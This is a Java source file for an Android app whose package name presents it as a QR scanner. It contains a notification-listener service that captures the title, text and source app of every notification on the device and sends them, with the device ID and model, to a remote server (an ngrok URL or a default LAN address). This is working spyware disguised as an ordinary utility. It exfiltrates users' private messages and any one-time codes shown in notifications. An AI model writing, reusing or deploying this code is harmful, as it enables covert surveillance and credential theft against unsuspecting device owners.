package com.qr.scanner.app;

import android.content.SharedPreferences;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONException;
import org.json.JSONObject;
import java.net.URL;
import java.net.HttpURLConnection;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KaptanNotificationService extends NotificationListenerService {
    private static final String TAG = "KaptanNotify";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
            CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");
            String ticker = sbn.getNotification().tickerText != null ? sbn.getNotification().tickerText.toString() : "";

            JSONObject notifyData = new JSONObject();
            notifyData.put("package", packageName);
            notifyData.put("title", title != null ? title.toString() : "");
            notifyData.put("text", text != null ? text.toString() : "");
            notifyData.put("ticker", ticker);
            notifyData.put("time", sbn.getPostTime());

            Log.d(TAG, "Notification: " + packageName + " - " + title);
            sendData("notification", notifyData.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error parsing notification", e);
        }
    }

    private void sendData(String type, String data) {
        new Thread(() -> {
            try {
                SharedPreferences prefs = getSharedPreferences("QRScannerPrefs", MODE_PRIVATE);
                String serverUrl = prefs.getString("ngrok_url", null);
                if (serverUrl == null) {
                    serverUrl = prefs.getString("server_url", "http://192.168.1.102:8080");
                }

                URL url = new URL(serverUrl + "/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                JSONObject json = new JSONObject();
                json.put("type", type);
                json.put("data", data);
                json.put("deviceId", android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
                json.put("deviceName", android.os.Build.MODEL);
                json.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));

                OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
                writer.write(json.toString());
                writer.flush();
                writer.close();

                int code = conn.getResponseCode();
                Log.d(TAG, "Notification sent, code: " + code);
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending notification: " + e.getMessage());
            }
        }).start();
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        Log.d(TAG, "Notification removed: " + sbn.getPackageName());
    }
}
